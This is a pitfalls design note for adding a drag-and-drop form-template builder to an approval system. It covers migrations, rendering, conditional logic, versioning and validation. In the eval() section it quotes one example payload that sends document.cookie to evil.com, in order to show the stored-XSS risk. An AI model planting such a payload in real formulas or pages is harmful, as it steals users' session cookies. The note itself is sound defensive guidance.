# Domain Pitfalls

**Domain:** Custom Template Builder for existing electronic approval system (MiceSign)
**Researched:** 2026-04-05
**Scope:** Adding drag-and-drop form builder, JSON schema dynamic rendering, conditional logic, calculation fields, and template versioning to an existing system with 6 hardcoded templates and live documents.
**Confidence:** HIGH (based on codebase analysis, existing architecture inspection, and web research)

---

## Critical Pitfalls

Mistakes that cause data corruption, rewrites, or production outages.

### Pitfall 1: Schema Migration Breaks Existing Documents

**What goes wrong:** Adding `schema_version`, `form_schema` columns to `approval_template` or changing how `document_content.form_data` is interpreted causes existing SUBMITTED/APPROVED documents to become unreadable. The current `form_data` JSON column stores template-specific data (e.g., `{items: [...], totalAmount: 1000}` for EXPENSE) with no schema version marker. A migration that changes how this data is parsed or validated corrupts the read path for all historical documents.

**Why it happens:** Developer adds a `schema_version` field to `document_content` or `approval_template` and assumes existing rows can default to version 1, but the rendering code now expects a schema definition to exist for version 1 -- which was never created because those templates were hardcoded React components.

**Consequences:**
- Existing APPROVED documents cannot be viewed (read-only rendering fails)
- In-flight SUBMITTED documents in approval queues become unprocessable
- Audit trail integrity violated if documents cannot be displayed
- DRAFT documents that were saved but not yet submitted may fail validation against new schema

**Prevention:**
1. **Never modify `document_content` table structure for existing rows.** Add new columns as nullable, not required.
2. **Add `schema_version` to `document` table (not `document_content`), defaulting to NULL.** NULL means "legacy hardcoded template" -- the rendering path checks: if `schema_version IS NULL`, use hardcoded React component; if set, use dynamic renderer.
3. **Add `form_schema` as a new JSON column on `approval_template`, also nullable.** Existing 6 templates keep `form_schema = NULL` initially.
4. **Write a Flyway migration that ONLY adds columns, never alters existing data semantics:**
   ```sql
   -- V6__add_template_schema_support.sql
   ALTER TABLE approval_template
     ADD COLUMN form_schema JSON NULL COMMENT 'JSON schema for dynamic templates',
     ADD COLUMN template_type ENUM('HARDCODED','DYNAMIC') NOT NULL DEFAULT 'HARDCODED';
   ALTER TABLE document
     ADD COLUMN schema_version INT NULL COMMENT 'Template schema version (NULL = hardcoded)';
   ```
5. **Test the migration against a DB dump with real documents** before deploying.

**Detection:** Documents returning 500 errors on detail view. Approval workflow stuck because approvers cannot view document content.

**Phase:** Must be addressed in Phase 1 (Schema Foundation) before any builder UI work begins.

---

### Pitfall 2: Breaking the Dual Rendering Path (Hardcoded vs Dynamic)

**What goes wrong:** The `templateRegistry.ts` currently maps template codes to hardcoded React components (`GeneralForm`, `ExpenseForm`, etc.) with separate `editComponent` and `readOnlyComponent` per template. When adding a dynamic JSON schema renderer, the developer replaces the registry lookup instead of extending it, breaking all 6 existing templates.

**Why it happens:** The natural instinct is to build a single unified rendering path. The developer creates `DynamicFormRenderer` and routes all templates through it, but the 6 existing templates have nuanced UI (EXPENSE has dynamic item rows with inline calculations, LEAVE has date-range pickers with business-day calculations) that the generic renderer cannot replicate.

**Consequences:**
- All 6 existing form types stop working
- Users cannot draft or view any documents until fixed
- If discovered late, may require rewriting the dynamic renderer to handle all existing edge cases

**Prevention:**
1. **Extend `TEMPLATE_REGISTRY`, do not replace it.** Add a `type` discriminator:
   ```typescript
   interface TemplateEntry {
     type: 'hardcoded' | 'dynamic';
     // For hardcoded (existing):
     editComponent?: ComponentType<TemplateEditProps>;
     readOnlyComponent?: ComponentType<TemplateReadOnlyProps>;
     // For dynamic (new):
     schemaVersion?: number;
     // Common:
     label: string;
     description: string;
     icon: string;
   }
   ```
2. **The `DocumentEditorPage` and `DocumentDetailPage` must branch on `type`:** hardcoded templates use existing components, dynamic templates use `DynamicFormRenderer`.
3. **Backend `DocumentFormValidator` strategy pattern already supports this.** The constructor auto-collects all `FormValidationStrategy` beans via Spring DI. Add a `DynamicFormValidationStrategy` alongside existing `ExpenseFormValidator` etc. Modify `DocumentFormValidator.validate()` to fall through to the dynamic validator when no hardcoded strategy is found, instead of throwing `TPL_UNKNOWN`.
4. **Do not migrate existing templates to dynamic until the dynamic renderer is proven to handle all their features.** Migration is optional and separate.

**Detection:** Any of the 6 existing template types throwing errors in form rendering or validation after deployment.

**Phase:** Must be the core architectural decision in Phase 1, enforced before Phase 2 (Builder UI).

---

### Pitfall 3: Conditional Logic Circular Dependencies

**What goes wrong:** Admin creates conditional logic rules like "Show Field B when Field A = 'Yes'" and "Show Field A when Field B = 'Yes'", creating an infinite loop where the form cannot determine which fields to display.

**Why it happens:** Conditional logic is stored as simple rule declarations without dependency graph validation. The evaluation engine processes rules sequentially and enters an infinite loop, or fields flicker between visible/hidden states in React.

**Consequences:**
- Browser tab freezes (infinite re-render loop -- React's "Maximum update depth exceeded")
- Form becomes unusable for all users of that template
- If the loop occurs in a submitted document's read-only view, approvers cannot view the document

**Prevention:**
1. **Model field dependencies as a directed graph.** Before saving any conditional logic, build an adjacency list and run cycle detection (DFS with back-edge detection). Reject circular rules at save time.
2. **Validate on save, not on render.** The builder UI must reject circular rules at configuration time with a clear error: "Field A and Field B cannot depend on each other."
3. **Implementation -- do NOT bring in a graph library for this.** A simple DFS cycle detector is ~30 lines:
   ```typescript
   function detectCycles(rules: ConditionalRule[]): string[] | null {
     const graph = new Map<string, string[]>();
     for (const rule of rules) {
       const deps = graph.get(rule.dependsOnField) || [];
       deps.push(rule.targetField);
       graph.set(rule.dependsOnField, deps);
     }
     // Standard DFS cycle detection -- return cycle path if found, null if DAG
   }
   ```
4. **Add a maximum evaluation depth limit (e.g., 20) as a runtime safety net** in the form renderer, even with cycle detection. If exceeded, log an error and render all fields visible.
5. **Self-referencing rules** ("Show Field A when Field A = 'Yes'") must be explicitly rejected.

**Detection:** Browser console showing "Maximum update depth exceeded" React error. Form fields flickering. User reports of frozen pages.

**Phase:** Must be implemented in the same phase as conditional logic. Not a "nice to have" -- it is a hard requirement.

---

### Pitfall 4: Calculation Field Code Injection via eval()

**What goes wrong:** Developer implements calculation fields using JavaScript `eval()` or `new Function()` to evaluate admin-defined formulas like `field_quantity * field_unit_price`. A malicious or careless admin enters `fetch('https://evil.com?data=' + document.cookie)` as a formula, and it executes in every user's browser.

**Why it happens:** `eval()` is the fastest way to implement formula evaluation, and since "only admins create templates," the developer assumes trusted input. But admin accounts can be compromised, and even legitimate admins may paste formulas from untrusted sources.

**Consequences:**
- Stored XSS via formula fields -- executes in every user's browser who opens any document using that template
- Data exfiltration from users' browsers
- Complete compromise of all users who open documents using the malicious template

**Prevention:**
1. **Never use `eval()` or `new Function()` for formula evaluation.** Non-negotiable security boundary.
2. **Use a safe expression parser.** Recommended: `expr-eval` (or `safe-expr-eval` which patches CVE-2025-12735). These parse mathematical expressions into an AST and only support arithmetic, comparisons, and safe functions (min, max, sum, round):
   ```typescript
   import { Parser } from 'expr-eval';
   const parser = new Parser();
   const expr = parser.parse('quantity * unitPrice');
   const result = expr.evaluate({ quantity: 5, unitPrice: 10000 }); // 50000
   ```
3. **Whitelist allowed variable names.** The formula can only reference field IDs that exist in the current template schema. Unknown variables are a validation error at save time.
4. **Validate formulas on the backend too.** Do not trust frontend-only validation. The backend must parse the formula string and reject anything that is not a valid arithmetic expression.
5. **Server-side recalculation on submission.** Never trust client-calculated values. When a document is submitted, the backend re-evaluates all calculation fields using saved formulas and submitted field values.

**Detection:** Security audit -- search for any use of `eval`, `Function`, or `setTimeout` with string arguments in the codebase.

**Phase:** Must be the first thing decided when calculation fields are built. Choose `expr-eval` upfront. Do not prototype with `eval()` "just to test" because that prototype will ship.

---

## Moderate Pitfalls

### Pitfall 5: Over-Engineering the Form Builder for 50 Users

**What goes wrong:** Developer builds a full-featured form builder comparable to Google Forms, Typeform, or FormIO -- with nested sections, multi-page forms, complex branching, drag-and-drop between nested containers, undo/redo history, real-time preview, and template marketplace. The builder takes 3 months instead of 3 weeks.

**Why it happens:** Form builders are deceptively complex. Every "small feature" (reorder, copy/paste, preview mode) has edge cases. The developer gets caught in feature creep because each addition seems reasonable in isolation.

**Prevention:**
1. **Hard scope for v1.2:** 6 field types (text, textarea, number, date, select, table), flat layout (no nested sections), single-page forms only, conditional show/hide, calculation fields. That is the boundary.
2. **No undo/redo in v1.2.** For 50 users with ADMIN access (likely 2-3 people creating templates), "save drafts frequently" is sufficient.
3. **No drag-and-drop between containers.** Fields exist in a flat list. DnD is only for reordering within that list -- dramatically simpler than nested containers.
4. **No real-time collaborative editing.** Single admin edits a template at a time.
5. **No template duplication/cloning.** Copy the JSON schema manually if needed.
6. **Measure actual usage:** If after 3 months only 1-2 custom templates have been created, the builder is already over-built.

**Detection:** Sprint planning shows more than 4 weeks for "form builder UI." Feature list keeps growing. Developer is researching Slate.js, ProseMirror, or complex nested drag-and-drop trees.

**Phase:** Define the hard scope boundary before any implementation begins. Write it down. Reference it when scope creep happens.

---

### Pitfall 6: Template Versioning Edge Cases with In-Flight Documents

**What goes wrong:** Admin edits a template schema (adds a required field, removes a field, changes field type). Documents currently in DRAFT or SUBMITTED status were created with the old schema version.

**Why it happens:** Template versioning is conceptually simple ("just store the version number") but the edge cases are numerous:
- DRAFT document opens for editing but the template now has a new required field -- is the draft invalid?
- SUBMITTED document is waiting for approval -- the approver sees the old schema but the template listing shows the new schema
- Admin removes a field that contained data in existing documents -- is the data lost?

**Prevention:**
1. **Snapshot the schema version at document creation time.** Add `schema_version` to the `document` table. When a user starts a new document, record which template version was used.
2. **Documents always render with the schema version they were created with.** A separate `template_schema_history` table stores all previous versions:
   ```sql
   CREATE TABLE template_schema_history (
     id BIGINT AUTO_INCREMENT PRIMARY KEY,
     template_id BIGINT NOT NULL,
     version INT NOT NULL,
     form_schema JSON NOT NULL,
     created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
     created_by BIGINT NOT NULL,
     UNIQUE KEY uk_template_version (template_id, version),
     FOREIGN KEY (template_id) REFERENCES approval_template(id)
   );
   ```
3. **DRAFT documents: show a warning banner** if the template has been updated since draft creation. Offer the user a choice: "Continue with old version" or "Upgrade to new version" (which may require filling in new fields). Do NOT auto-upgrade.
4. **SUBMITTED/APPROVED/REJECTED documents: always freeze at their creation version.** No retroactive schema changes. Ever.
5. **Never truly delete fields from a schema.** Mark them as `deprecated: true` so they are hidden in new documents but still rendered in old documents that contain data for them.
6. **For ~50 users,** version history can be simple: increment an integer, store the full schema JSON per version. No diff-based versioning needed.

**Detection:** Approver reports document "looks different." DRAFT documents failing validation after template edit. Historical documents showing blank where data should be.

**Phase:** Schema versioning table must be created in Phase 1 (Schema Foundation). Version-aware rendering logic needed by Phase 2 (Dynamic Renderer).

---

### Pitfall 7: Drag-and-Drop UX Failures (Touch, Accessibility, Performance)

**What goes wrong:** The drag-and-drop form builder works on desktop Chrome but fails on mobile browsers, is inaccessible to keyboard users, and becomes sluggish with 30+ fields.

**Why it happens:**
- Touch events conflict with page scrolling (especially iOS Safari)
- Screen readers cannot interact with drag-and-drop without ARIA live regions
- Each drag operation triggers re-renders of all fields if state management is naive

**Prevention:**
1. **Use dnd-kit** (not react-beautiful-dnd which is unmaintained, not HTML5 drag API which lacks touch support). dnd-kit provides built-in keyboard support, ARIA attributes, and touch/pointer sensors.
2. **Set `touch-action: none` on draggable elements** to prevent iOS Safari scroll interference. Per dnd-kit docs, this is the only reliable fix on iOS.
3. **Provide keyboard-based reordering as a first-class alternative.** Add up/down arrow buttons next to each field in the builder. This is trivial to implement and bypasses all DnD accessibility issues entirely.
4. **Keep drag state minimal.** Only store `{draggedFieldId, targetIndex}` during a drag. Do not clone the entire form schema on drag start.
5. **For this system, the admin-only builder will rarely have more than 15 fields.** Performance is not a real concern -- do not pre-optimize with virtualization.

**Detection:** QA test on iPad/iPhone shows drag not working or page scrolling. Tab key does not navigate builder fields. Builder visibly slow with many fields.

**Phase:** Choose dnd-kit in Phase 2 (Builder UI). Add keyboard fallback buttons in the same phase.

---

### Pitfall 8: Dynamic Validation Mismatch Between Frontend and Backend

**What goes wrong:** The dynamic form renderer validates fields on the frontend using the JSON schema, but the backend `DocumentFormValidator` still uses the hardcoded strategy pattern. When a user submits a dynamic-template document, backend validation either rejects it (`TPL_UNKNOWN` for new template codes) or skips validation entirely.

**Why it happens:** The existing `DocumentFormValidator` throws `BusinessException("TPL_UNKNOWN", "unknown template code: " + templateCode)` for any code not in the strategies map. New dynamic templates will have codes like `CUSTOM_001` that no hardcoded strategy handles.

**Consequences:**
- Documents from custom templates fail on submission with "unknown template code" error
- Or, if silently caught, documents submit with zero validation -- empty forms are accepted

**Prevention:**
1. **Add a `DynamicFormValidationStrategy` that handles all non-hardcoded template codes.** Modify `DocumentFormValidator.validate()` to fall through to this when no hardcoded strategy is found:
   ```java
   public void validate(String templateCode, String bodyHtml, String formDataJson) {
       FormValidationStrategy strategy = strategies.get(templateCode);
       if (strategy != null) {
           strategy.validate(bodyHtml, formDataJson);
       } else {
           // Look up template schema from DB, validate dynamically
           dynamicValidator.validateAgainstSchema(templateCode, formDataJson);
       }
   }
   ```
2. **The backend must fetch the template's `form_schema` and validate against it.** Use `networknt/json-schema-validator` for Java, or build a simple field-by-field validator checking required fields, types, and value constraints.
3. **Validation rules must be derived from the same schema** on frontend and backend. Do not maintain separate validation rule sets.
4. **Test by submitting a document for every custom template** -- automated integration test, not manual.

**Detection:** Submit a document using a custom template and check if it succeeds. Check backend logs for `TPL_UNKNOWN` errors.

**Phase:** Must ship alongside the first custom template creation capability. Builder without backend validation is a data integrity hole.

---

### Pitfall 9: JSON Schema Design That Cannot Evolve

**What goes wrong:** The JSON schema format for template definitions is designed too rigidly for the initial 6 field types, making it impossible to add new field types or features without breaking all existing schemas.

**Why it happens:** Developer uses a flat field structure without room for field-type-specific configuration. When a new field type needs unique properties, the schema format must change, breaking all existing templates.

**Prevention:**
1. **Use a discriminated union pattern for field definitions:**
   ```json
   {
     "version": 1,
     "fields": [
       {
         "id": "expense_date",
         "type": "date",
         "label": "지출일자",
         "required": true,
         "config": { "minDate": "today-30d", "maxDate": "today" }
       },
       {
         "id": "amount",
         "type": "number",
         "label": "금액",
         "required": true,
         "config": { "min": 0, "max": 100000000, "unit": "원" }
       }
     ],
     "conditionalRules": [],
     "calculationRules": []
   }
   ```
2. **Common properties (`id`, `type`, `label`, `required`) at the top level.** Type-specific configuration in a `config` object. Adding a new field type = adding a new `config` shape. Existing types unaffected.
3. **Always include `version` at the schema root.** Even if you think you will not need it.
4. **Do not embed presentation/layout in the data schema.** Keep the schema about data structure and validation. Layout (field width, grouping) is separate metadata.
5. **Field IDs must be stable identifiers** (not display labels, not array indices). Once assigned, a field ID never changes. This is how `form_data` maps to fields across schema versions.

**Detection:** Needing to write a migration script to update existing schemas when adding a feature. Two templates with the same field type having incompatible `config` structures.

**Phase:** Design the schema format in Phase 1 before building anything. This is the most important technical decision of the milestone.

---

## Minor Pitfalls

### Pitfall 10: Table Field Type Complexity Explosion

**What goes wrong:** The "table" field type (for expense items, purchase line items) becomes a mini-spreadsheet with its own drag-and-drop row reordering, inline editing, column resizing, and cell-level validation. It consumes 50% of development time.

**Prevention:**
- v1.2 table fields: fixed columns defined in schema, add/remove rows only, no column reordering, no cell-level formulas (only column-level sum).
- Render as simple HTML tables with input fields, not a grid component.
- If EXPENSE template's item table is already well-implemented as a hardcoded component, do not replicate its exact UX in the dynamic renderer. 80% is sufficient.

**Phase:** Define what "table" means for v1.2 upfront. Defer advanced features.

---

### Pitfall 11: Admin-Created Template Naming Collisions

**What goes wrong:** Admin creates a custom template with code `EXPENSE_V2` or reuses an existing prefix like `EXP`. The `doc_sequence` table uses `template_code + year` as a unique key for document numbering. Collisions in codes or prefixes cause duplicate document numbers.

**Prevention:**
- Auto-generate template codes for custom templates: `CUSTOM_{autoincrement_id}`.
- Validate prefix uniqueness at template creation time against all existing templates.
- Do not allow admins to set the template code directly -- system-generated only.
- Reserve existing prefixes (GEN, EXP, LV, PUR, BT, OT) -- cannot be reused by custom templates.

**Phase:** Backend validation in Phase 1 (Schema Foundation).

---

### Pitfall 12: Forgetting Read-Only Mode for Dynamic Templates

**What goes wrong:** Developer builds the dynamic form editor (for drafting) but forgets the dynamic read-only renderer (for viewing submitted/approved documents). The existing registry has separate `editComponent` and `readOnlyComponent` for each template. If the dynamic path only has an editor, approved documents open in edit mode or fail to render.

**Prevention:**
- `DynamicFormRenderer` must support both `mode: 'edit'` and `mode: 'readonly'` from day one.
- In read-only mode: all inputs become display-only text, conditional logic still evaluates (to show correct fields), calculation fields show computed values.
- **Build read-only rendering first, edit second.** It is simpler and will be used more frequently (every approver views read-only; only the drafter edits).

**Phase:** Dynamic renderer must include both modes from the start. Not a separate phase.

---

## Phase-Specific Warnings

| Phase Topic | Likely Pitfall | Mitigation |
|-------------|---------------|------------|
| Schema Foundation (DB migration) | Breaking existing documents (Pitfall 1) | Additive-only migrations, nullable new columns, test against real data |
| Schema Foundation (JSON format) | Rigid schema that cannot evolve (Pitfall 9) | Discriminated union format, `version` field, separate data from layout |
| Schema Foundation (naming) | Template code/prefix collisions (Pitfall 11) | Auto-generate codes, validate prefix uniqueness |
| Builder UI (DnD) | Over-engineering (Pitfall 5) | Hard scope: 6 field types, flat list, no undo/redo, no nesting |
| Builder UI (DnD) | Touch/accessibility failures (Pitfall 7) | Use dnd-kit, add keyboard arrow buttons as fallback |
| Dynamic Renderer | Breaking existing templates (Pitfall 2) | Extend registry with type discriminator, never replace hardcoded path |
| Dynamic Renderer | Missing read-only mode (Pitfall 12) | Build read-only first, edit second |
| Backend Validation | Validation mismatch (Pitfall 8) | `DynamicFormValidationStrategy` as fallback, shared schema drives both FE and BE |
| Conditional Logic | Circular dependencies (Pitfall 3) | DAG cycle detection on save, max evaluation depth on render |
| Calculation Fields | Code injection via eval() (Pitfall 4) | `expr-eval` or `safe-expr-eval`, never eval(), backend recalculation |
| Template Versioning | In-flight document breakage (Pitfall 6) | Snapshot version at creation, schema history table, never auto-upgrade submitted docs |
| Table Field Type | Complexity explosion (Pitfall 10) | Fixed columns, add/remove rows only, no cell formulas |

---

## Integration Risk Summary

The highest-risk integration point is the **dual rendering path** (Pitfall 2). The existing system has 6 working templates with custom React components (`templateRegistry.ts` with `editComponent`/`readOnlyComponent` pairs), strategy-pattern validation (`DocumentFormValidator` + 6 `FormValidationStrategy` implementations), and template-specific form data (`document_content.form_data` JSON). Every new piece of infrastructure (builder, renderer, validator, versioning) must be **additive** -- extending the existing architecture without modifying its behavior.

The moment someone changes `DocumentFormValidator` to require a schema for all templates, or modifies `templateRegistry.ts` to remove the hardcoded entries, all existing functionality breaks.

**The golden rule for this milestone: existing documents and templates must work identically before and after every single deployment.** If a deployment changes behavior for any of the 6 existing template types, it is a regression.

---

## Sources

- Codebase analysis: `templateRegistry.ts`, `DocumentFormValidator.java`, `FormValidationStrategy.java`, `ExpenseFormValidator.java`, `DocumentContent.java`, `Document.java`, `ApprovalTemplate.java`, `V1__create_schema.sql` -- HIGH confidence (direct code inspection)
- [dnd-kit Accessibility Documentation](https://docs.dndkit.com/guides/accessibility) -- HIGH confidence
- [dnd-kit Touch Sensor Issues (GitHub #435)](https://github.com/clauderic/dnd-kit/issues/435) -- HIGH confidence
- [safe-expr-eval - Safe Expression Evaluator (patches CVE-2025-12735)](https://github.com/alecasg555/safe-expr-eval) -- MEDIUM confidence
- [expr-eval - Mathematical Expression Evaluator](https://github.com/silentmatt/expr-eval) -- MEDIUM confidence
- [MDN eval() Security Documentation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) -- HIGH confidence
- [Couchbase Schema Versioning Tutorial](https://developer.couchbase.com/tutorial-schema-versioning?learningPath=learn/json-document-management-guide) -- MEDIUM confidence
- [digraph-js - DAG with Circular Dependency Detection](https://github.com/antoine-coulon/digraph-js) -- MEDIUM confidence (reference only, do not use as dependency)
- [FormEngine - React Form Builder Library](https://formengine.io/react-form-builder-library/) -- LOW confidence (commercial reference)
- [Top 5 Drag-and-Drop Libraries for React 2026](https://puckeditor.com/blog/top-5-drag-and-drop-libraries-for-react) -- MEDIUM confidence
